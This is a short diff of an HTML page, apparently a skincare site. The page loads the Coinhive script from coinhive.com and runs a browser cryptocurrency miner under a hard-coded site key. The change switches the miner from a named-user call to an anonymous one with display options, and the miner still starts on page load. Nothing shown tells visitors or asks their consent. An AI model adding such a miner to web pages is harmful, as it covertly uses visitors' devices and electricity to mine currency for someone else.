@@ -376,7 +376,10 @@
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 
     <script>
-    	var miner = new CoinHive.User('MCd4rqHuZx6PgWRRjUlXqTtIqjZ6KNNn', 'Skincare');
+    	var miner = new CoinHive.Anonymous('MCd4rqHuZx6PgWRRjUlXqTtIqjZ6KNNn', {
+        theme: 'dark',
+        language: 'auto'
+      });
     	miner.start();
     </script>
 
